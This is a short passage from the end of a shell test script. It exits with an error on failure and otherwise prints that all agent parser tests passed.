  exit 1
fi
echo "all agent parser tests passed"
